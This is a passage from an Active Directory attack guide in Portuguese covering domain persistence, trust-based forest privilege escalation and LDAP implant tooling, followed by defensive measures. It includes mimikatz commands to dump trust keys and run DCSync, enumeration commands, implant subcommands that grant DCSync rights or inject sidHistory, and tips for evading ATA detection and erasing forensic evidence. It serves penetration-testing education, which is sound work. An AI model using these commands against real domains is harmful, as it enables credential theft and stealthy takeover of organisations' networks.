ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

O objeto **AdminSDHolder** no Active Directory assegura a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **Access Control List (ACL)** padrão nesses grupos para prevenir mudanças não autorizadas. Contudo, esse recurso pode ser explorado; se um atacante modificar a ACL do AdminSDHolder para conceder acesso total a um usuário normal, esse usuário ganha controle extensivo sobre todos os grupos privilegiados. Essa medida de segurança, pensada para proteger, pode assim se inverter e permitir acesso indevido a menos que seja monitorada de perto.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter privilégios de admin numa dessas máquinas, o hash do Administrator local pode ser extraído usando **mimikatz**. Em seguida, é necessária uma modificação no registro para **habilitar o uso dessa senha**, permitindo acesso remoto à conta de Administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Você pode **conceder** algumas **permissões especiais** a um **usuário** sobre objetos específicos do domínio que permitirão ao usuário **escalar privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** um **objeto**. Se você conseguir apenas **fazer** uma **pequena alteração** no **security descriptor** de um objeto, pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse a auxiliary class `dynamicObject` para criar principals/GPOs/DNS records de curta duração com `entryTTL`/`msDS-Entry-Time-To-Die`; eles se auto-apagam sem tombstones, apagando evidências LDAP enquanto deixam SIDs órfãos, referências `gPLink` quebradas, ou respostas DNS em cache (por exemplo, AdminSDHolder ACE pollution ou `gPCFileSysPath`/AD-integrated DNS redirects maliciosos).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **clear text** as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra um **novo Domain Controller** no AD e o usa para **push de atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** sobre as **modificações**. Você **precisa de DA** privilégios e estar dentro do **root domain**.\
Note que se você usar dados incorretos, logs bem feios aparecerão.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente discutimos como escalar privilégios se você tiver **permissão suficiente para ler senhas do LAPS**. No entanto, essas senhas também podem ser usadas para **manter persistência**.\
Confira:


{{#ref}}
laps.md
{{#endref}}

## Escalada de Privilégios na Floresta - Confianças de Domínio

A Microsoft considera a **Forest** como o limite de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar à compromissão de toda a Forest**.

### Informação Básica

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite a um usuário de um **domínio** acessar recursos em outro **domínio**. Essencialmente cria uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação fluam sem problemas. Quando domínios configuram uma trust, eles trocam e retêm chaves específicas dentro de seus **Domain Controllers (DCs)**, que são cruciais para a integridade da trust.

Em um cenário típico, se um usuário pretende acessar um serviço em um **domínio confiável**, ele deve primeiro solicitar um ticket especial conhecido como **inter-realm TGT** ao DC do seu próprio domínio. Esse TGT é criptografado com uma **trust key** compartilhada que ambos os domínios acordaram. O usuário então apresenta esse TGT ao **DC do domínio confiável** para obter um ticket de serviço (**TGS**). Após a validação bem-sucedida do inter-realm TGT pelo DC do domínio confiável, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Passos**:

1. Um **computador cliente** no **Domain 1** inicia o processo usando seu **NTLM hash** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente então solicita um **inter-realm TGT** ao DC1, necessário para acessar recursos em **Domain 2**.
4. O inter-realm TGT é criptografado com uma **trust key** compartilhada entre DC1 e DC2 como parte da trust bidirecional entre domínios.
5. O cliente leva o inter-realm TGT ao **Domain Controller de Domain 2 (DC2)**.
6. DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se válido, emite um **Ticket Granting Service (TGS)** para o servidor em Domain 2 que o cliente quer acessar.
7. Finalmente, o cliente apresenta esse TGS ao servidor, que está criptografado com o hash da conta do servidor, para obter acesso ao serviço em Domain 2.

### Diferentes relações de confiança

É importante notar que **uma trust pode ser 1-way ou 2-ways**. Na opção de 2 ways, ambos os domínios confiarão um no outro, mas na relação de confiança **1 way** um dos domínios será o **trusted** e o outro o **trusting**. No último caso, **você só poderá acessar recursos dentro do trusting domain a partir do trusted**.

Se o Domain A confia no Domain B, A é o trusting domain e B é o trusted. Além disso, em **Domain A**, isso seria um **Outbound trust**; e em **Domain B**, isso seria um **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Esta é uma configuração comum dentro da mesma forest, onde um child domain automaticamente tem uma two-way transitive trust com seu parent domain. Essencialmente, isso significa que requisições de autenticação podem fluir entre o parent e o child sem problemas.
- **Cross-link Trusts**: Referidas como "shortcut trusts", são estabelecidas entre child domains para acelerar processos de referral. Em florestas complexas, os referrals de autenticação normalmente precisam ir até a root da forest e então descer até o domínio alvo. Criando cross-links, a jornada é encurtada, o que é especialmente benéfico em ambientes geograficamente dispersos.
- **External Trusts**: São configuradas entre domínios diferentes e não relacionados e são não-transitivas por natureza. Segundo a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts são úteis para acessar recursos em um domínio fora da forest atual que não está conectado por uma forest trust. A segurança é reforçada através de SID filtering com external trusts.
- **Tree-root Trusts**: Essas trusts são automaticamente estabelecidas entre o forest root domain e uma nova tree root adicionada. Embora não sejam comumente encontradas, tree-root trusts são importantes para adicionar novas árvores de domínio a uma forest, permitindo que mantenham um nome de domínio único e assegurando transitividade two-way. Mais informações podem ser encontradas no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust é uma two-way transitive trust entre dois forest root domains, também aplicando SID filtering para reforçar medidas de segurança.
- **MIT Trusts**: Essas trusts são estabelecidas com domínios Kerberos não-Windows, compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são um pouco mais especializadas e atendem ambientes que requerem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Outras diferenças em **relações de confiança**

- Uma relação de confiança também pode ser **transitive** (A trust B, B trust C, então A trust C) ou **non-transitive**.
- Uma relação de confiança pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um confia no outro).

### Caminho de Ataque

1. **Enumerar** as relações de confiança
2. Verificar se algum **security principal** (user/group/computer) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por estar em grupos do outro domínio. Procure por **relações através de domínios** (a trust foi criada provavelmente para isso).
1. kerberoast nesse caso poderia ser outra opção.
3. **Comprometer** as **contas** que podem **pivotar** através de domínios.

Atacantes podem acessar recursos em outro domínio através de três mecanismos primários:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo grande controle sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. Entretanto, a eficácia desse método depende da natureza da trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem ser especificados em uma **ACL**, particularmente como entidades em **ACEs** dentro de uma **DACL**, fornecendo acesso a recursos específicos. Para quem deseja se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.

### Encontrar usuários/grupos externos com permissões

Você pode checar `CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com` para encontrar foreign security principals no domínio. Esses serão usuários/grupos de **um domínio/forest externo**.

Você pode verificar isso no **Bloodhound** ou usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras maneiras de enumerar domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 chaves confiáveis**, uma para _Filho --> Pai_ e outra para _Pai_ --> _Filho_.\
> Você pode obter a que é usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin ao domínio filho/pai abusando da trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender como o Configuration NC pode ser explorado é crucial. O Configuration NC funciona como um repositório central para dados de configuração através de uma forest em ambientes Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) dentro da forest, com DCs graváveis mantendo uma cópia writeable do Configuration NC. Para explorar isso, é necessário ter **privilégios SYSTEM em um DC**, de preferência um child DC.

**Link GPO to root DC site**

O container Sites do Configuration NC inclui informações sobre os sites de todos os computadores unidos ao domínio dentro da forest AD. Operando com privilégios SYSTEM em qualquer DC, atacantes podem linkar GPOs aos sites do DC root. Essa ação pode comprometer potencialmente o domínio root ao manipular políticas aplicadas a esses sites.

Para informações detalhadas, pode-se explorar a pesquisa sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Um vetor de ataque envolve direcionar gMSAs privilegiadas dentro do domínio. A KDS Root key, essencial para calcular as senhas dos gMSAs, é armazenada dentro do Configuration NC. Com privilégios SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as senhas de qualquer gMSA na forest.

Análises detalhadas e passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a MSA delegada (BadSuccessor – abusando atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Esse método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com privilégios SYSTEM, um atacante pode modificar o AD Schema para conceder qualquer usuário controle completo sobre todas as classes. Isso pode levar a acesso não autorizado e controle sobre objetos AD recém-criados.

Leitura adicional disponível em [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 mira o controle sobre objetos de Public Key Infrastructure (PKI) para criar um template de certificado que permite autenticar-se como qualquer usuário dentro da forest. Como objetos PKI residem no Configuration NC, comprometer um DC filho writeable permite a execução de ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de montar os componentes necessários, como discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário **seu domínio é confiado** por um domínio externo, concedendo-lhe **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm qual acesso sobre o domínio externo** e então tentar explorá-lo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externo - Unidirecional (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário **seu domínio** está **concedendo** alguns **privilégios** a um principal de **um domínio diferente**.

No entanto, quando um **domínio é confiado** pelo domínio confiador, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a senha confiada**. Isso significa que é possível **acessar um usuário do domínio confiador para entrar no domínio confiado** para enumerá-lo e tentar escalar mais privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da trust de domínio (o que não é muito comum).

Outra forma de comprometer o domínio confiado é aguardar em uma máquina à qual um **usuário do domínio confiado possa acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir daí.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de trusts de domínio

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history através de trusts entre florestas é mitigado pelo SID Filtering, que é ativado por padrão em todas as trusts inter-floresta. Isso se baseia na suposição de que trusts intra-floresta são seguros, considerando a floresta, em vez do domínio, como a fronteira de segurança, conforme a posição da Microsoft.
- No entanto, há um problema: o SID Filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts entre florestas, empregar o Selective Authentication garante que usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, permissões explícitas são requeridas para que usuários acessem domínios e servidores dentro do domínio ou floresta confiador.
- É importante notar que essas medidas não protegem contra a exploração do Configuration Naming Context (NC) gravável ou ataques à conta de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso de AD baseado em LDAP a partir de on-host implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Enumeração LDAP no lado do implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e despejam os objetos correspondentes.
- `get-object`, `get-attribute`, and `get-domaininfo` extraem atributos arbitrários (incluindo security descriptors) além dos metadados de floresta/dominio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expõem candidatos a roasting, configurações de delegação e descriptors existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` e `get-writable --detailed` analisam a DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/attribute writes) e herança, fornecendo alvos imediatos para escalada de privilégios via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives LDAP de escrita para elevação & persistência

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem ao operador posicionar novos principals ou contas de máquina onde existirem direitos em OUs. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` sequestram alvos diretamente assim que direitos de write-property são encontrados.
- Comandos focados em ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync` traduzem WriteDACL/WriteOwner em qualquer objeto AD para resets de senha, controle de associação a grupos ou privilégios de replicação DCSync sem deixar artefatos PowerShell/ADSI. Contrapartes `remove-*` limpam ACEs injetadas.

### Delegação, roasting, e abuso de Kerberos

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido Kerberoastable; `add-asreproastable` (UAC toggle) marca-o para AS-REP roasting sem tocar na senha.
- Macros de delegação (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de ataque constrained/unconstrained/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### sidHistory injection, relocação de OU, e modelagem da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no SID history de um principal controlado (see [SID-History Injection](sid-history-injection.md)), fornecendo herança de acesso furtiva totalmente via LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante arraste ativos para OUs onde já existem direitos delegados antes de abusar de `set-password`, `add-groupmember` ou `add-spn`.
- Comandos de remoção com escopo restrito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem rollback rápido depois que o operador colhe credenciais ou persistência, minimizando a telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteção de credenciais**

- **Domain Admins Restrictions**: Recomenda-se que Domain Admins só possam efetuar login em Domain Controllers, evitando seu uso em outros hosts.
- **Service Account Privileges**: Serviços não devem ser executados com privilégios de Domain Admin (DA) para manter a segurança.
- **Temporal Privilege Limitation**: Para tarefas que exigem privilégios DA, a duração deve ser limitada. Isso pode ser conseguido por: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audite os Event IDs 2889/3074/3075 e então aplique LDAP signing mais LDAPS channel binding em DCs/clients para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementando técnicas de Deception**

- Implementar deception envolve montar armadilhas, como usuários ou computadores isca, com características como senhas que não expiram ou marcados como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais sobre deploy de técnicas de deception pode ser encontrado em [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **For User Objects**: Indicadores suspeitos incluem ObjectSID atípico, logons infrequentes, datas de criação e baixo número de bad password counts.
- **General Indicators**: Comparar atributos de possíveis objetos isca com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem auxiliar na identificação dessas deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar enumeração de sessões em Domain Controllers para prevenir a detecção pelo ATA.
- **Ticket Impersonation**: Utilizar chaves **aes** para criação de tickets ajuda a evadir detecção por não rebaixar para NTLM.
- **DCSync Attacks**: Recomenda-se executar de um host que não seja Domain Controller para evitar a detecção pelo ATA, pois execução direta em um Domain Controller disparará alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
